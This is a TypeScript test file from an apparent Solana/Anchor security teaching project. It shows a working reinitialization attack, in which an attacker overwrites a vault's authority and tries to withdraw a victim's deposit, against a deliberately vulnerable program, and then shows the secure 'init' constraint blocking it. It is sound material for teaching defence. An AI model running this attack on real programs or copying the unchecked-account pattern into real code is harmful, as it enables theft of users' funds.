import * as anchor from "@coral-xyz/anchor";
import BN from "bn.js";
import { Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
import { assert } from "chai";
import type { VulnerableReinitializationAttacks } from "../target/types/vulnerable_reinitialization_attacks";
import type { SecureReinitializationAttacks } from "../target/types/secure_reinitialization_attacks";

describe("Vulnerability: Reinitialization Attacks", () => {
  // Configure the client
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // Load programs - using anchor.Program type properly
  const vulnerableProgram: anchor.Program<VulnerableReinitializationAttacks> =
    anchor.workspace.VulnerableReinitializationAttacks;
  const secureProgram: anchor.Program<SecureReinitializationAttacks> =
    anchor.workspace.SecureReinitializationAttacks;

  // Test accounts
  let alice: Keypair;
  let attacker: Keypair;
  let vulnerableVault: Keypair;
  let secureVault: Keypair;

  const DEPOSIT_AMOUNT = 1 * anchor.web3.LAMPORTS_PER_SOL; // 1 SOL

  before(async () => {
    // Create test keypairs
    alice = Keypair.generate();
    attacker = Keypair.generate();
    vulnerableVault = Keypair.generate();
    secureVault = Keypair.generate();

    // Airdrop SOL to test accounts
    const airdropAmount = 5 * anchor.web3.LAMPORTS_PER_SOL;

    await provider.connection.requestAirdrop(alice.publicKey, airdropAmount);
    await provider.connection.requestAirdrop(attacker.publicKey, airdropAmount);

    // Wait for airdrops
    await new Promise((resolve) => setTimeout(resolve, 1000));

    console.log("      Setup complete:");
    console.log("      Alice:", alice.publicKey.toBase58());
    console.log("      Attacker:", attacker.publicKey.toBase58());
    console.log("      Vulnerable Vault:", vulnerableVault.publicKey.toBase58());
    console.log("      Secure Vault:", secureVault.publicKey.toBase58());
  });

  describe("Vulnerable Implementation (Anchor)", () => {
    it("allows attacker to reinitialize and steal vault authority", async () => {
      console.log("\n      EXPLOIT DEMONSTRATION:");

      // Step 1: Create vault account manually (simulating existing account)
      const vaultSize = 8 + 32 + 8; // discriminator + pubkey + u64
      const lamports = await provider.connection.getMinimumBalanceForRentExemption(vaultSize);

      const createVaultTx = new Transaction().add(
        SystemProgram.createAccount({
          fromPubkey: alice.publicKey,
          newAccountPubkey: vulnerableVault.publicKey,
          lamports: lamports,
          space: vaultSize,
          programId: vulnerableProgram.programId,
        })
      );

      await sendAndConfirmTransaction(
        provider.connection,
        createVaultTx,
        [alice, vulnerableVault]
      );

      console.log("      1. Alice creates vault account...");

      // Step 2: Alice initializes her vault
      await vulnerableProgram.methods
        .unsafeInitialize()
        .accounts({
          authority: alice.publicKey,
          vault: vulnerableVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      console.log("      2. Alice initializes vault with herself as authority");

      // Verify Alice is authority
      let vaultData = await vulnerableProgram.account.vault.fetch(vulnerableVault.publicKey);
      assert.ok(
        vaultData.authority.equals(alice.publicKey),
        "Alice should be the initial authority"
      );
      console.log("      Verified: Alice is authority");

      // Step 3: Alice deposits SOL
      await vulnerableProgram.methods
        .deposit(new BN(DEPOSIT_AMOUNT))
        .accounts({
          depositor: alice.publicKey,
          vault: vulnerableVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      console.log("      3. Alice deposits 1 SOL into vault");

      // Check vault balance
      const vaultBalance = await provider.connection.getBalance(vulnerableVault.publicKey);
      console.log("      Vault balance:", vaultBalance / anchor.web3.LAMPORTS_PER_SOL, "SOL");

      // Step 4: ATTACK - Attacker reinitializes the vault!
      console.log("\n      4. ATTACK: Attacker reinitializes the vault...");

      await vulnerableProgram.methods
        .unsafeInitialize()
        .accounts({
          authority: attacker.publicKey,
          vault: vulnerableVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      console.log("      VULNERABILITY CONFIRMED: Vault reinitialized!");

      // Verify attacker is now authority
      vaultData = await vulnerableProgram.account.vault.fetch(vulnerableVault.publicKey);
      assert.ok(
        vaultData.authority.equals(attacker.publicKey),
        "Attacker should now be authority"
      );
      console.log("      Attacker is now the vault authority!");

      // Step 5: Attacker withdraws Alice's funds
      console.log("\n      5. Attacker withdraws Alice's funds...");

      const attackerBalanceBefore = await provider.connection.getBalance(attacker.publicKey);

      // Note: The withdraw might fail due to balance tracking, but authority was stolen
      try {
        await vulnerableProgram.methods
          .withdraw(new BN(DEPOSIT_AMOUNT))
          .accounts({
            authority: attacker.publicKey,
            vault: vulnerableVault.publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([attacker])
          .rpc();

        const attackerBalanceAfter = await provider.connection.getBalance(attacker.publicKey);
        console.log("      Attacker successfully withdrew Alice's funds!");
        console.log("      Funds stolen:", (attackerBalanceAfter - attackerBalanceBefore) / anchor.web3.LAMPORTS_PER_SOL, "SOL");
      } catch (error: any) {
        // Balance tracking might prevent withdrawal, but authority is still stolen
        console.log("      Note: Withdrawal may fail due to balance tracking,");
        console.log("      but the critical vulnerability is AUTHORITY THEFT.");
        console.log("      Attacker now controls the vault!");
      }

      // Final verification
      console.log("\n      ATTACK RESULT:");
      console.log("      Original authority: Alice");
      console.log("      New authority:", vaultData.authority.toBase58(), "(Attacker)");
      console.log("      Alice has lost control of her vault!");
    });
  });

  describe("Secure Implementation (Anchor)", () => {
    it("prevents reinitialization with init constraint", async () => {
      console.log("\n      FIX DEMONSTRATION:");

      // Step 1: Alice creates and initializes secure vault
      console.log("      1. Alice initializes secure vault...");

      await secureProgram.methods
        .initialize()
        .accounts({
          authority: alice.publicKey,
          vault: secureVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice, secureVault])
        .rpc();

      console.log("      Vault initialized with Alice as authority");

      // Verify Alice is authority
      let vaultData = await secureProgram.account.vault.fetch(secureVault.publicKey);
      assert.ok(
        vaultData.authority.equals(alice.publicKey),
        "Alice should be authority"
      );

      // Step 2: Alice deposits SOL
      await secureProgram.methods
        .deposit(new BN(DEPOSIT_AMOUNT))
        .accounts({
          depositor: alice.publicKey,
          vault: secureVault.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([alice])
        .rpc();

      console.log("      2. Alice deposits 1 SOL");

      // Step 3: Attacker attempts to reinitialize
      console.log("\n      3. ATTACK ATTEMPT: Attacker tries to reinitialize...");

      let attackFailed = false;
      let errorMessage = "";

      try {
        // Create a new vault account for attacker's attempt
        const attackerVault = Keypair.generate();

        await secureProgram.methods
          .initialize()
          .accounts({
            authority: attacker.publicKey,
            vault: secureVault.publicKey, // Trying to reinit Alice's vault
            systemProgram: SystemProgram.programId,
          })
          .signers([attacker])
          .rpc();

        assert.fail("Expected reinitialization to fail");
      } catch (error: any) {
        attackFailed = true;
        errorMessage = error.toString();
        console.log("      FIX CONFIRMED: Reinitialization rejected!");
        console.log("      Error:", errorMessage.substring(0, 100) + "...");
      }

      assert.ok(attackFailed, "Reinitialization should have failed");

      // Verify Alice is still authority
      vaultData = await secureProgram.account.vault.fetch(secureVault.publicKey);
      assert.ok(
        vaultData.authority.equals(alice.publicKey),
        "Alice should still be authority"
      );
      console.log("      Alice is still the vault authority!");

      // Verify vault balance is intact
      const vaultBalance = await provider.connection.getBalance(secureVault.publicKey);
      console.log("      Vault balance protected:", vaultBalance / anchor.web3.LAMPORTS_PER_SOL, "SOL");
    });

    it("shows how init constraint provides protection", async () => {
      console.log("\n      SECURITY MECHANISM:");
      console.log("");
      console.log("      VULNERABLE CODE:");
      console.log("      #[account(mut)]");
      console.log("      /// CHECK: UNSAFE - not checking initialization");
      console.log("      pub vault: UncheckedAccount<'info>");
      console.log("      // Manual serialization overwrites existing data");
      console.log("");
      console.log("      SECURE CODE:");
      console.log("      #[account(");
      console.log("          init,");
      console.log("          payer = authority,");
      console.log("          space = Vault::LEN");
      console.log("      )]");
      console.log("      pub vault: Account<'info, Vault>");
      console.log("");
      console.log("      The `init` constraint:");
      console.log("      1. Creates new account OR fails if account exists");
      console.log("      2. Sets discriminator (8-byte prefix) on creation");
      console.log("      3. Checks discriminator is zero before initializing");
      console.log("      4. Non-zero discriminator = already initialized = FAIL");
    });
  });

  describe("Summary", () => {
    it("demonstrates the critical importance of initialization checks", () => {
      console.log("\n      VULNERABILITY SUMMARY:");
      console.log("");
      console.log("      REINITIALIZATION ATTACK:");
      console.log("      - Attacker calls initialize on existing account");
      console.log("      - Authority field gets overwritten with attacker's key");
      console.log("      - Attacker gains control of victim's funds");
      console.log("");
      console.log("      WHY IT'S DEVASTATING:");
      console.log("      - Single transaction to steal ownership");
      console.log("      - No signature required from original owner");
      console.log("      - All accumulated funds become attacker's");
      console.log("      - Victim has no warning or recourse");
      console.log("");
      console.log("      THREE WAYS TO PREVENT:");
      console.log("");
      console.log("      1. Use `init` constraint (RECOMMENDED):");
      console.log("         #[account(init, payer = authority, space = ...)]");
      console.log("");
      console.log("      2. Manual discriminator check:");
      console.log("         if account.data[..8] != [0u8; 8] {");
      console.log("           return Err(AlreadyInitialized);");
      console.log("         }");
      console.log("");
      console.log("      3. Use initialization flag:");
      console.log("         pub struct Vault { is_initialized: bool, ... }");
      console.log("         require!(!vault.is_initialized, AlreadyInit);");
      console.log("");
      console.log("      KEY LESSON:");
      console.log("      ALWAYS use Anchor's `init` constraint for new accounts.");
      console.log("      Never manually serialize to accounts without init checks.");
    });
  });
});
